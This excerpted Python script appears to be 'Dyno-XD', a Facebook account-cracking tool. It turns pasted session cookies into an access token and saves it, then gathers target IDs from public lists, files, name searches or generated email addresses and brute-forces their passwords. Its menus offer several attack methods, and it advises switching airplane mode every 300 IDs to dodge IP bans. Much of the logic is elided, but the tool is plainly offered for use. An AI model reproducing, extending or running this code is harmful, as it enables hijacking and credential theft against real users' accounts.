...
try:
        ...
        cetak(nel('\t• installing Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t• installing Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(nel('\t• installingl Modul Requests •'))
...
console = Console()
sys.stdout.write('\x1b]2; HI WELCOME TO DYNO TOOLS\x07')
#------------------[ USER-AGENT ]-------------------#
pretty.install()
CON=sol()
ugen2=[]
...
try:
	...
	print(' ╰─➣ IM THE KING HOW CAN FUCK TOOLS Dyno-XD🚬 ')
...
88888888ba,  8b        d8  888b      88    ,ad8888ba,    
88      `"8b  Y8,    ,8P   8888b     88   d8"'    `"8b   
88        `8b  Y8,  ,8P    88 `8b    88  d8'        `8b  
88         88   "8aa8"     88  `8b   88  88          88  
88         88    `88'      88   `8b  88  88          88  
88         8P     88       88    `8b 88  Y8,        ,8P  
88      .a8P      88       88     `8888   Y8a.    .a8P   
88888888Y"'       88       88      `888    `"Y8888Y"'    
                                                         
\033[30m[\033[32m+\033[30m] AUTHOR: DynoXD
\033[30m[\033[32m+\033[30m] TELEGRAM: @i4m_DYNO
\033[30m[\033[32m+\033[30m] GITHUB: Dyno-XD
''')
import requests
os.system('clear')
...
def DYNO_LOGIN():
	os.system('clear')
	banner()
	cetak(panel(f"[01] Login Cookies [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Enter Cookies",padding=(0,2),style=f"bold white"))
	bryn = input(f' ╰─  choice : ')
	if bryn in ['1','01']:
		MRDYNO()
	elif bryn in ['222','0222']:
		lainnya()
	elif bryn in ['333','0333']:
		bot()
	elif bryn in ['444','0444']:
		result()
	else:
		print(' ╰─> Your Choice Is Big ')
		time.sleep(5)
		back()
...
def MRDYNO():
	try:
		cetak(nel('Enter Fresh Cookies Crack Account',width=90,style=f"bold white"))
		your_cookies = input(' Cookies :\033[33m ')
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print(f"\n\033[30m[\033[32m+\033[30m] Token : {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print("\n\033[30m[\033[32m+\033[30m] Login GOOD");exit()
			except Exception as e:
				print(" [-] Cookies NO")
...
def menu(my_name,my_id):
	...
	banner()
	print('')
	print('\x1b[31m•\x1b[33m•\x1b[32m•\x1b[36m MENU \x1b[31m•\x1b[33m•\x1b[32m•')
	print('')
	print('\033[30m[\033[32m?\033[30m] \033[30m01 - CRACK PUBLIC \033[33m[ \033[32mON \033[33m] ')
	print('\033[30m[\033[32m?\033[30m] \033[30m02 - CRACK FILE \033[33m[ \033[32mON \033[33m] ')
	print('\033[30m[\033[32m?\033[30m] \033[30m03 - CRACK NAME \033[33m[ \033[32mON \033[33m] ')
	print('\033[30m[\033[32m?\033[30m] \033[30m04 - CRACK EMAIL \033[33m[ \033[32mON \033[33m] ')
	print('\033[30m[\033[32m?\033[30m] \033[30m05 - CHECK \x1b[38;5;46mOK\x1b[38;5;255m•\x1b[38;5;196mCP \033[33m[ \033[32mON \033[33m] ')
	print('\033[30m[\033[32m?\033[30m] \033[31m0 - Exit ')
	print('')
	DYNO_XD = input(f'\033[30m[\033[32m?\033[30m] Choice Menu : ')
	if DYNO_XD in ['1','01']:
		DYNO_publick()
	elif DYNO_XD in ['2','02']:
		DYNO_File()
	elif DYNO_XD in ['5','05']:
		DYNO_result()
	elif DYNO_XD in ['3','03']:
		DYNO_name()
	elif DYNO_XD in ['4','04']:
		DYNO_email()
	elif DYNO_XD in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f' ╰─  {m}Sukses Logout+dellet Cookies{x}')
		time.sleep(5)
		login()
	else:
...
def DYNO_name():
	...
	nam = console.input(f' ≫kami yan old yan new yakik bnusa : ').split(",")
	for ser in nam:		
...
def cari_nama(link):
	...
	if(link):
	  sys.stdout.write(f"\r ╰─ Totall {len(id)} Idz ...");sys.stdout.flush()
...
def DYNO_email():
	...
	global ok , cp
	cetak(nel(f'Input Random Name To Crack',width=90,padding=(0,5),style=f"bold white"))
	nama = console.input(f' ==> Name Target : ')
	if ',' in str(nama):
		print(f" ╰─  Masukan Nama, Jangan Kosong Ngab")
		time.sleep(3);exit()
	cetak(nel(f'Masukan Name Domain , Like : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
	doma = console.input(f' ==>  Masukan Name Domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f" ╰─  Masukan Domain Dengan Benar")
		time.sleep(3);exit()
	cetak(nel(f'Max 5000 Idz,Methode Mobile',width=90,padding=(0,5),style=f"bold white"))
	...
	for xyz in range(int(jumlah)):
		...
		sys.stdout.write(f"\r ☞ Dumping {len(id)} Idz...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	
...
#-----------------[ CRACK FILE ]-----------------#
def DYNO_File():
			print(' \x1b[31m•\x1b[33m•\x1b[32m•\x1b[36m MENU CRACK FILE \x1b[31m•\x1b[33m•\x1b[32m•')
			print('')
			print("\033[30m[\033[32m?\033[30m]FILE CLONING")
			try:
				print('')
				fileX = input ('\n\033[33m[\033[32m+\033[33m] Enter File Path : ') 
...
def DYNO_publick():
	print('')
	print(' \x1b[31m•\x1b[33m•\x1b[32m•\x1b[36m MENU CRACK ID PUBLICK \x1b[31m•\x1b[33m•\x1b[32m•')
	print('')
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		...
		exit()
	try:
		jum = int(input('\033[30m[\033[32m?\033[30m]\x1b[1;90m HOW MANY IDS ? ≫ \033[31m '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input('\033[30m[\033[32m?\033[30m]PASTE ID ⪼ '+str(yz)+' = \x1b[1;93m')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f'\033[30m[\033[32m+\033[30m] TOTAL IDS ≫ {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('\x1b[1;93m[\x1b[1;92m!\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mSinyal Anda Kurang Bagus Nih !')
...
def setting():
	print('')
	print('\x1b[31m•\x1b[33m•\x1b[32m•\x1b[36m MENU SETTING \x1b[31m•\x1b[33m•\x1b[32m•')
	print('')
	print('\033[30m[\033[32m?\033[30m] 1. CLONE FB RANDOM ')
	hu = input(f'\033[30m[\033[32m?\033[30m]Choice : ')
	if hu in ['11','011']:
		...
		exit()
	print('')
	print(' \x1b[31m•\x1b[33m•\x1b[32m•\x1b[36m MENU METHODE \x1b[31m•\x1b[33m•\x1b[32m•')
	print('')
	print('\033[30m[\033[32m?\033[30m]METHODE MOBILE [ 1 ] ')
	print('\033[30m[\033[32m?\033[30m]METHODE MBASIC [ 2 ] ')
	print('\033[30m[\033[32m?\033[30m]METHODE ASYNC [ 3 ] ')
	print('\033[30m[\033[32m?\033[30m]METHODE API [ 4 ] ')
	print('')
	hc = input(f'\033[30m[\033[32m?\033[30m]Choice Metode : ')
	if hc in ['111','0111']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('\033[30m[\033[32m?\033[30m]CLOLING FAST [ 1 ]')
	if _jembot_ in ['']:
		print('\033[30m[\033[32m?\033[30m]SHOW APPS ? [ T-Y ] ')
		back()
	elif _jembot_ in ['1','01']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('\033[30m[\033[32m?\033[30m]ALL PASS ? [ T-Y ] ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def passwrd():
	...
	cetak(panel(f'\t[bold white]On/Off Your AirPlane Mode For Every 300idz if you not you will get Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
...
def crackmbasic(idf,pwv):
	...
	ses = requests.Session()
	prog.update(des,description=f"{h}DynoXD{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
...
if __name__=='__main__':
	...
	try:os.system('touch DYNO-PROXY.txt')
	except:pass
	try:os.system('clear')
	except:pass
	DYNO()